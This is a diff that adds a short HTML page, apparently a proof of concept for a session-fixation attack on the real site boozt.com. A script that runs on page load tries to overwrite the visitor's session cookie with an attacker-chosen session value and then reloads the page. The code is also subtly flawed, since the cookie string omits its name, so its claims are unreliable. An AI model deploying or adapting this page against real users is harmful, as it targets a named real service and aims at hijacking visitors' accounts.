@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Session Hijack</title>
+  <script>
+    // Function to change PHPSESSID to the attacker's session ID
+    function hijackSession() {
+      document.cookie = "36ocil8q0bvffop746jvo3903o; path=/; domain=boozt.com";
+      
+      // Force a page reload so the victim's session switches
+      window.location.reload();  
+    }
+
+    // Run hijackSession when the page loads
+    window.onload = hijackSession;
+  </script>
+</head>
+<body>
+  <h1>Session Hijack Attack</h1>
+  <p>If you are seeing this message, your session is being hijacked...</p>
+</body>
+</html>
